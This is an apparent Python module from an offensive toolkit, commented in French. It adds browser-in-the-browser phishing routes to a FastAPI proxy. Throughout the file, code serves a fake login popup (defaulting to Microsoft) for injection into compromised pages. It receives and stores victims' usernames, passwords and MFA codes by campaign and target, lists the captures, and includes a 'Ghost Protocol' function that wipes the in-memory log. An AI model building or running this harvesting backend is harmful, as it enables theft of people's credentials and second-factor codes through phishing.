"""
attack/bitb/integration.py — Intègre BitB dans le proxy Vantablack
==================================================================

Expose un endpoint FastAPI (`/_/bitb/capture`) qui reçoit les credentials
capturés par le JavaScript de la popup, et un endpoint (`/_/bitb/popup`)
qui sert la popup à injecter dans une page compromise.

Stockage : SQLite chiffré via Fernet (AES-128-CBC + HMAC-SHA256).
Clé Fernet : captures/.bitb_enc_key (générée auto si absente).
"""

from __future__ import annotations

import base64
import json
import logging
import os
import sqlite3
import uuid
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional

from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse

from .generator import BitBTarget, generate_bitb_popup, list_targets

logger = logging.getLogger("attack.bitb")

# ------------------------------------------------------------------
# Stockage SQLite chiffré Fernet
# ------------------------------------------------------------------

_CAPTURES_DIR = Path("captures")
_DB_PATH = _CAPTURES_DIR / "bitb.db"
_KEY_PATH = _CAPTURES_DIR / ".bitb_enc_key"


def _ensure_storage() -> "FernetStorage":
    """Initialise le dossier captures, la clé Fernet et retourne un storage."""
    _CAPTURES_DIR.mkdir(parents=True, exist_ok=True)
    # Créer / charger la clé Fernet
    if not _KEY_PATH.exists():
        from cryptography.fernet import Fernet

        key = Fernet.generate_key()
        _KEY_PATH.write_bytes(key)
        try:
            os.chmod(_KEY_PATH, 0o600)
        except OSError:
            pass
    return FernetStorage(db_path=str(_DB_PATH), key_path=str(_KEY_PATH))


class FernetStorage:
    """Stocke les captures BitB dans une DB SQLite, payloads chiffrés Fernet."""

    def __init__(self, db_path: str, key_path: str) -> None:
        from cryptography.fernet import Fernet

        self.db_path = db_path
        self._key = Path(key_path).read_bytes()
        self._fernet = Fernet(self._key)
        self._init_db()

    def _init_db(self) -> None:
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                """
                CREATE TABLE IF NOT EXISTS bitb_captures (
                    capture_id TEXT PRIMARY KEY,
                    created_at TEXT NOT NULL,
                    target_host TEXT,
                    campaign_id TEXT,
                    stage TEXT,
                    username TEXT,
                    payload_enc BLOB NOT NULL
                )
                """
            )
            conn.commit()
            try:
                os.chmod(self.db_path, 0o600)
            except OSError:
                pass

    def encrypt(self, payload: Dict[str, Any]) -> bytes:
        data = json.dumps(payload, default=str).encode("utf-8")
        return self._fernet.encrypt(data)

    def decrypt(self, blob: bytes) -> Dict[str, Any]:
        return json.loads(self._fernet.decrypt(blob).decode("utf-8"))

    def insert_capture(
        self,
        *,
        username: Optional[str] = None,
        password: Optional[str] = None,
        mfa: Optional[str] = None,
        campaign_id: Optional[str] = None,
        target_host: Optional[str] = None,
        extra: Optional[Dict[str, Any]] = None,
    ) -> str:
        capture_id = uuid.uuid4().hex
        now = datetime.utcnow().isoformat() + "Z"
        payload: Dict[str, Any] = {
            "username": username,
            "password": password,
            "mfa": mfa,
        }
        if extra:
            payload.update(extra)
        blob = self.encrypt(payload)
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                "INSERT INTO bitb_captures (capture_id, created_at, target_host, campaign_id, stage, username, payload_enc) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (
                    capture_id,
                    now,
                    target_host,
                    campaign_id,
                    "credentials",
                    username,
                    blob,
                ),
            )
            conn.commit()
        return capture_id

    def list(self, limit: int = 100) -> List[Dict[str, Any]]:
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            rows = conn.execute(
                "SELECT capture_id, created_at, target_host, campaign_id, stage, username FROM bitb_captures "
                "ORDER BY created_at DESC LIMIT ?",
                (limit,),
            ).fetchall()
        return [dict(r) for r in rows]


# Singleton paresseux
_storage: Optional[FernetStorage] = None


def _get_storage() -> FernetStorage:
    global _storage
    if _storage is None:
        _storage = _ensure_storage()
    return _storage


# Stockage en mémoire secondaire (pour la compatibilité Ghost Protocol)
_captured: list[dict[str, Any]] = []


def _record_capture(stage: str, payload: dict[str, Any]) -> str:
    """Enregistre une capture BitB : DB Fernet + journal mémoire. Retourne capture_id."""
    storage = _get_storage()
    extra = {k: v for k, v in payload.items() if k not in {"username", "password", "mfa", "campaign_id", "target_host"}}
    capture_id = storage.insert_capture(
        username=payload.get("username"),
        password=payload.get("password"),
        mfa=payload.get("mfa"),
        campaign_id=payload.get("campaign_id") or payload.get("campaign"),
        target_host=payload.get("target_host") or payload.get("target"),
        extra=extra,
    )
    record = {
        "capture_id": capture_id,
        "stage": stage,
        "ts": datetime.utcnow().isoformat() + "Z",
        **payload,
    }
    _captured.append(record)
    logger.warning(
        "[BITB] %s captured: id=%s campaign=%s target=%s user=%s",
        stage, capture_id[:8],
        payload.get("campaign_id") or payload.get("campaign"),
        payload.get("target_host") or payload.get("target"),
        payload.get("username", "?"),
    )
    return capture_id


def register_bitb_routes(
    app: FastAPI,
    capture_path: str = "/_/bitb/capture",
    popup_path: str = "/_/bitb/popup",
) -> None:
    """
    Enregistre les routes FastAPI pour BitB sur l'app passée en paramètre.

    Routes exposées :
      - POST <capture_path> : reçoit credentials JSON {username, password,
        mfa?, campaign_id?, target_host?} → stocke dans SQLite chiffré →
        retourne {ok: true, capture_id}

      - GET <popup_path> : query `target=microsoft` (ou autre) et optionnel
        `capture-endpoint=URL` → retourne HTML popup via generate_bitb_popup()

    Usage typique :
        from fastapi import FastAPI
        from attack.bitb.integration import register_bitb_routes
        app = FastAPI()
        register_bitb_routes(app)
    """
    # ---- POST : réception d'un credential capturé -----------------------
    @app.post(capture_path, include_in_schema=False)
    async def bitb_capture(request: Request):
        try:
            body_bytes = await request.body()
            body_text = body_bytes.decode("utf-8", errors="ignore")
            payload: Dict[str, Any] = {}
            try:
                payload = json.loads(body_text)
            except json.JSONDecodeError:
                from urllib.parse import parse_qs

                payload = {k: v[0] for k, v in parse_qs(body_text).items()}
            # Accepter aussi : campaign_id / campaign, target_host / target
            norm = dict(payload)
            if "campaign" in norm and "campaign_id" not in norm:
                norm["campaign_id"] = norm["campaign"]
            if "target" in norm and "target_host" not in norm:
                norm["target_host"] = norm["target"]
            capture_id = _record_capture("credentials", norm)
            return JSONResponse({"ok": True, "capture_id": capture_id})
        except Exception as e:
            logger.exception("[BITB] capture error: %s", e)
            return JSONResponse({"ok": False, "error": str(e)}, status_code=400)

    # ---- GET : sert la popup BitB à injecter ----------------------------
    @app.get(popup_path, include_in_schema=False)
    async def bitb_popup(
        target: str = "microsoft",
        capture_endpoint: Optional[str] = None,
        url: str = "",
    ):
        try:
            # Accepter `capture-endpoint` (underscore-less) en fallback
            endpoint = capture_endpoint or capture_path
            html = generate_bitb_popup(
                target=target,
                capture_endpoint=endpoint,
                fake_url=url or None,
            )
            return HTMLResponse(content=html)
        except ValueError as e:
            return JSONResponse(
                {"error": str(e), "supported": list_targets()},
                status_code=400,
            )

    # ---- GET : listage des captures (pour la CLI) -----------------------
    @app.get("/_/bitb/captures", include_in_schema=False)
    async def bitb_list():
        try:
            storage = _get_storage()
            db_rows = storage.list(limit=200)
        except Exception:
            db_rows = []
        return JSONResponse(
            {
                "count_db": len(db_rows),
                "count_mem": len(_captured),
                "captures": db_rows,
            }
        )

    logger.info(
        "[BITB] Routes registered: POST %s, GET %s (Fernet DB: %s)",
        capture_path, popup_path, _DB_PATH,
    )


def get_captures() -> list[dict[str, Any]]:
    """Pour la CLI / le reporting (version mémoire)."""
    return list(_captured)


def clear_captures() -> int:
    """Pour le Ghost Protocol — vide le journal BitB. Retourne le nb effacé."""
    n = len(_captured)
    _captured.clear()
    logger.info("[BITB] Cleared %d captures (Ghost Protocol mem)", n)
    return n
